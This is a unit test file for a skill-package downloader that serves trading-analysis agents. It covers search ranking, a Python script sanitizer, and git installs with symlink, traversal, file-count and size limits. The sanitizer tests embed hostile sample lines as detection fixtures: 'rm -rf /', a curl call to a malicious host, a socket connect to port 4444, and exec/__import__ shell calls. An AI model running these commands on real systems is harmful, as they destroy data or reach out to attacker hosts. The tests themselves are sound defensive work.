// Unit tests for SkillDownloader search, script sanitizer, and git/archive download with security checks.

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { SkillDownloader } from '../../src/skills/downloader.js';
import type { SkillPackage } from '../../src/skills/types.js';

const execFileAsync = promisify(execFile);

// Helper to format YAML frontmatter with body markdown.
function fm(
  fields: Record<string, unknown>,
  body = 'Detailed instructions describing how the skill should be applied.',
): string {
  const lines = ['---'];
  for (const [key, value] of Object.entries(fields)) {
    if (Array.isArray(value)) {
      lines.push(`${key}: [${value.map((v) => JSON.stringify(v)).join(', ')}]`);
    } else {
      lines.push(`${key}: ${JSON.stringify(value)}`);
    }
  }
  lines.push('---', body);
  return lines.join('\n');
}

// Helper to construct a mock SkillPackage in memory.
function mockSkill(
  name: string,
  overrides?: Partial<SkillPackage['manifest']> & { instructions?: string },
): SkillPackage {
  const { instructions = 'Default instructions', ...manifestOverrides } = overrides ?? {};
  return {
    manifest: {
      name,
      description: `Description for ${name}`,
      version: '1.0.0',
      available_from: '2026-08-20',
      target_agents: [],
      tags: [],
      status: 'draft',
      ...manifestOverrides,
    },
    instructions,
    moduleName: name.replaceAll('-', '_'),
    examples: [],
    lintWarnings: [],
    contentHash: 'a'.repeat(64),
  };
}

describe('SkillDownloader.search & searchLocal', () => {
  const downloader = new SkillDownloader();

  const skills: SkillPackage[] = [
    mockSkill('wyckoff-volume-spread', {
      description: 'Bhavcopy delivery volume vs price spread analysis for absorption and distribution.',
      tags: ['volume', 'vsa', 'wyckoff', 'delivery'],
      target_agents: ['retail', 'price'],
      instructions: 'Analyze effort vs result and identify smart money accumulation.',
    }),
    mockSkill('fii-derivative-positioning', {
      description: 'Participant-wise Index Futures long/short ratio squeeze detector.',
      tags: ['fii', 'derivatives', 'futures', 'squeeze'],
      target_agents: ['fii'],
      instructions: 'Track extreme net short positions (<15%) predicting short squeezes.',
    }),
    mockSkill('dii-sip-resilience', {
      description: 'Monthly mutual fund cash buffer absorption against global macro selloffs.',
      tags: ['dii', 'mutual-funds', 'sip'],
      target_agents: ['dii'],
      instructions: 'Evaluate domestic institutional investor resilience and floor bidding.',
    }),
    mockSkill('option-chain-pcr-skew', {
      description: 'Strike-wise OI build-up and max-pain migration over option chains.',
      tags: ['options', 'pcr', 'max-pain', 'skew'],
      target_agents: ['retail', 'fii'],
      instructions: 'Monitor put-call ratio changes and option pain point migrations.',
    }),
  ];

  it('ranks exact name match at the highest position', () => {
    const results = downloader.search('wyckoff-volume-spread', skills);
    expect(results.length).toBeGreaterThan(0);
    expect(results[0]?.manifest.name).toBe('wyckoff-volume-spread');
  });

  it('ranks tag matches higher than general body text matches', () => {
    const customSkills: SkillPackage[] = [
      mockSkill('skill-a', {
        description: 'Generic overview',
        tags: [],
        instructions: 'Mentions squeeze in body text only.',
      }),
      mockSkill('skill-b', {
        description: 'Derivatives framework',
        tags: ['squeeze'],
        instructions: 'Generic instructions.',
      }),
    ];
    const results = downloader.search('squeeze', customSkills);
    expect(results.map((s) => s.manifest.name)).toEqual(['skill-b', 'skill-a']);
  });

  it('matches skills by description and target_agents', () => {
    const results = downloader.search('mutual fund', skills);
    expect(results.length).toBe(1);
    expect(results[0]?.manifest.name).toBe('dii-sip-resilience');

    const agentResults = downloader.search('fii', skills);
    expect(agentResults.some((s) => s.manifest.name === 'fii-derivative-positioning')).toBe(true);
  });

  it('returns all skills when query is empty or whitespace', () => {
    const emptyResults = downloader.search('', skills);
    expect(emptyResults).toHaveLength(skills.length);

    const whitespaceResults = downloader.search('   ', skills);
    expect(whitespaceResults).toHaveLength(skills.length);
  });

  it('returns empty array when query does not match any skill', () => {
    const results = downloader.search('cryptocurrency-bitcoin-moon', skills);
    expect(results).toEqual([]);
  });

  it('breaks ties with deterministic alphabetical name order', () => {
    const tieSkills: SkillPackage[] = [
      mockSkill('zebra-skill', { tags: ['momentum'] }),
      mockSkill('alpha-skill', { tags: ['momentum'] }),
      mockSkill('beta-skill', { tags: ['momentum'] }),
    ];
    const results = downloader.search('momentum', tieSkills);
    expect(results.map((s) => s.manifest.name)).toEqual(['alpha-skill', 'beta-skill', 'zebra-skill']);
  });

  it('provides searchLocal as an alias to search', () => {
    const res1 = downloader.search('options', skills);
    const res2 = downloader.searchLocal('options', skills);
    expect(res1).toEqual(res2);
  });
});

describe('SkillDownloader.sanitizeScript', () => {
  const downloader = new SkillDownloader();

  it('returns safe=true for clean numerical and data parsing Python scripts', () => {
    const cleanScript = `
import numpy as np
import pandas as pd

def calculate_vwap(df: pd.DataFrame) -> pd.Series:
    q = df['volume']
    p = df['close']
    return (p * q).cumsum() / q.cumsum()
`;
    const res = downloader.sanitizeScript(cleanScript);
    expect(res.safe).toBe(true);
    expect(res.reason).toBeUndefined();
  });

  it('detects os.system primitives', () => {
    const hostile = `
import os
os.system("rm -rf /")
`;
    const res = downloader.sanitizeScript(hostile);
    expect(res.safe).toBe(false);
    expect(res.reason).toMatch(/os\.system/i);
  });

  it('detects subprocess usage', () => {
    const hostile = `
import subprocess
subprocess.run(["curl", "http://malicious.com"])
`;
    const res = downloader.sanitizeScript(hostile);
    expect(res.safe).toBe(false);
    expect(res.reason).toMatch(/subprocess/i);
  });

  it('detects eval and exec primitives', () => {
    const resEval = downloader.sanitizeScript('result = eval("1 + 1")\n');
    expect(resEval.safe).toBe(false);
    expect(resEval.reason).toMatch(/eval/i);

    const resExec = downloader.sanitizeScript('exec("import os; os.system(\'id\')")\n');
    expect(resExec.safe).toBe(false);
    expect(resExec.reason).toMatch(/exec/i);
  });

  it('detects socket imports and calls', () => {
    const hostile = `
from socket import socket, AF_INET, SOCK_STREAM
s = socket(AF_INET, SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
`;
    const res = downloader.sanitizeScript(hostile);
    expect(res.safe).toBe(false);
    expect(res.reason).toMatch(/socket/i);
  });

  it('detects __import__ primitives', () => {
    const hostile = `
mod = __import__('os')
mod.system('whoami')
`;
    const res = downloader.sanitizeScript(hostile);
    expect(res.safe).toBe(false);
    expect(res.reason).toMatch(/__import__/i);
  });

  it('detects shutil.rmtree and rmtree calls', () => {
    const hostile = `
import shutil
shutil.rmtree('/tmp/sensitive')
`;
    const res = downloader.sanitizeScript(hostile);
    expect(res.safe).toBe(false);
    expect(res.reason).toMatch(/rmtree/i);
  });
});

describe('SkillDownloader.downloadFromGit & download (Git fetch & security boundaries)', () => {
  let targetDir: string;
  let repoDir: string;
  const cleanupDirs: string[] = [];

  const downloader = new SkillDownloader();

  beforeEach(async () => {
    targetDir = await mkdtemp(join(tmpdir(), 'target-skills-'));
    repoDir = await mkdtemp(join(tmpdir(), 'git-repo-'));
    cleanupDirs.push(targetDir, repoDir);

    // Initialize a git repo in repoDir with user config for commits
    await execFileAsync('git', ['init'], { cwd: repoDir });
    await execFileAsync('git', ['config', 'user.name', 'Test User'], { cwd: repoDir });
    await execFileAsync('git', ['config', 'user.email', 'test@example.com'], { cwd: repoDir });
  });

  afterEach(async () => {
    for (const d of cleanupDirs) {
      await rm(d, { recursive: true, force: true });
    }
    cleanupDirs.length = 0;
  });

  it('downloads, validates, and installs a valid skill package from a git repository', async () => {
    const skillContent = fm({
      name: 'remote-wyckoff',
      description: 'Downloaded Wyckoff volume spread analysis.',
      available_from: '2026-08-20',
      tags: ['volume', 'vsa'],
    });
    const scriptContent = 'def parse_bhavcopy(): return True\n';

    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');
    await writeFile(join(repoDir, 'script.py'), scriptContent, 'utf-8');
    await mkdir(join(repoDir, 'examples'), { recursive: true });
    await writeFile(join(repoDir, 'examples', 'sample.md'), 'Example walk-forward test.', 'utf-8');

    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Add remote skill'], { cwd: repoDir });

    const pkg = await downloader.downloadFromGit(repoDir, '', targetDir);

    expect(pkg.manifest.name).toBe('remote-wyckoff');
    expect(pkg.manifest.status).toBe('draft');
    expect(pkg.moduleName).toBe('remote_wyckoff');
    expect(pkg.scriptPath).toBe(join(targetDir, 'remote-wyckoff', 'script.py'));
    expect(pkg.examples).toHaveLength(1);
    expect(pkg.lintWarnings).toHaveLength(0);
    expect(pkg.contentHash).toHaveLength(64);
  });

  it('supports downloading a skill located in a subpath within the repo', async () => {
    const subpath = 'packages/fii-tools';
    const subDir = join(repoDir, subpath);
    await mkdir(subDir, { recursive: true });

    const skillContent = fm({
      name: 'nested-fii-tool',
      description: 'Nested repository skill package.',
      available_from: '2026-08-20',
    });
    await writeFile(join(subDir, 'SKILL.md'), skillContent, 'utf-8');

    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Add nested skill'], { cwd: repoDir });

    const pkg = await downloader.downloadFromGit(repoDir, subpath, targetDir);
    expect(pkg.manifest.name).toBe('nested-fii-tool');
    expect(pkg.directory).toBe(join(targetDir, 'nested-fii-tool'));
  });

  it('records soft lint warnings for dangerous script primitives without blocking installation', async () => {
    const skillContent = fm({
      name: 'lint-warn-skill',
      description: 'Skill containing a suspicious subprocess call.',
      available_from: '2026-08-20',
    });
    const scriptContent = 'import subprocess\nsubprocess.run(["ls"])\n';

    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');
    await writeFile(join(repoDir, 'script.py'), scriptContent, 'utf-8');

    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Add skill with lint warnings'], { cwd: repoDir });

    const pkg = await downloader.downloadFromGit(repoDir, '', targetDir);
    expect(pkg.manifest.name).toBe('lint-warn-skill');
    expect(pkg.lintWarnings.length).toBeGreaterThan(0);
    expect(pkg.lintWarnings[0]).toMatch(/subprocess/i);
  });

  it('hard-rejects packages containing symlinks (host security boundary)', async () => {
    const skillContent = fm({
      name: 'symlink-skill',
      description: 'Skill with symlink attempt.',
      available_from: '2026-08-20',
    });
    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');
    await writeFile(join(repoDir, 'target.txt'), 'hello', 'utf-8');
    await symlink(join(repoDir, 'target.txt'), join(repoDir, 'link.txt'));

    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Add symlink skill'], { cwd: repoDir });

    await expect(downloader.downloadFromGit(repoDir, '', targetDir)).rejects.toThrow(/symlink/i);
  });

  it('hard-rejects subpath path traversal escaping repository root', async () => {
    const skillContent = fm({
      name: 'traversal-skill',
      description: 'Valid skill in root.',
      available_from: '2026-08-20',
    });
    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');
    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Root commit'], { cwd: repoDir });

    await expect(downloader.downloadFromGit(repoDir, '../../etc', targetDir)).rejects.toThrow(/traversal|escape/i);
  });

  it('hard-rejects packages missing SKILL.md or with invalid manifests', async () => {
    await writeFile(join(repoDir, 'README.md'), 'Missing SKILL.md completely', 'utf-8');
    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'No skill.md'], { cwd: repoDir });

    await expect(downloader.downloadFromGit(repoDir, '', targetDir)).rejects.toThrow(/SKILL\.md/i);
  });

  it('hard-rejects packages with more than 50 files', async () => {
    const skillContent = fm({
      name: 'many-files-skill',
      description: 'Skill with too many files.',
      available_from: '2026-08-20',
    });
    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');

    for (let i = 0; i < 55; i++) {
      await writeFile(join(repoDir, `file_${i}.txt`), `content ${i}`, 'utf-8');
    }

    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Too many files'], { cwd: repoDir });

    await expect(downloader.downloadFromGit(repoDir, '', targetDir)).rejects.toThrow(/file count|limit/i);
  });

  it('hard-rejects packages exceeding 5MB total size', async () => {
    const skillContent = fm({
      name: 'large-skill',
      description: 'Skill with huge file size.',
      available_from: '2026-08-20',
    });
    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');

    // Create a 6MB dummy buffer
    const largeBuffer = Buffer.alloc(6 * 1024 * 1024, 0x41);
    await writeFile(join(repoDir, 'large_payload.bin'), largeBuffer);

    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Too large'], { cwd: repoDir });

    await expect(downloader.downloadFromGit(repoDir, '', targetDir)).rejects.toThrow(/size limit/i);
  });

  it('download method delegates to downloadFromGit', async () => {
    const skillContent = fm({
      name: 'delegated-skill',
      description: 'Delegated download test.',
      available_from: '2026-08-20',
    });
    await writeFile(join(repoDir, 'SKILL.md'), skillContent, 'utf-8');
    await execFileAsync('git', ['add', '.'], { cwd: repoDir });
    await execFileAsync('git', ['commit', '-m', 'Delegated download'], { cwd: repoDir });

    const pkg = await downloader.download(repoDir, targetDir);
    expect(pkg.manifest.name).toBe('delegated-skill');
  });
});
